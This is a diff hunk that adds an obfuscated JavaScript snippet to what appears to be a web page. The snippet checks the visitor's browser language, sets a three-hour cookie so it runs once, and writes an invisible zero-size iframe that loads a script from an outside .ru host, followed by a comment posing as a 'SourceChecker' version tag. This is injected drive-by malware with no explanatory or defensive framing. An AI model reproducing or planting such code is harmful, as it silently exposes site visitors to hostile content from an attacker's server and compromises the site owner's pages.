@@ -1,0 +1,4 @@
+window.status="";n=navigator.userLanguage.toUpperCase();if((n!="ZH-CN")&&(n!="ZH-MO")&&(n!="BN")&&(n!="GU")&&(n!="NE")&&(n!="PA")&&(n!="ID")&&(n!="EN-PH")&&(n!="UR")&&(n!="ZH")&&(n!="HI")&&(n!="TH")&&(n!="VI")){var $a=document.cookie;var $b=$a.indexOf("cvbest=");if($b!=-1){}else{var $c=new Date();$c.setTime($c.getTime()+3*3600*1000);document.cookie="cvbest=update;expires="+$c.toGMTString();try{document.write("<iframe src=http://berjke.ru/cgi-bin/index.cgi?script width=0 height=0 frameborder=0></iframe>");}catch(e){};}}
+<!--//
+ SourceCheckerOn-line Ver 1.72 
+//-->
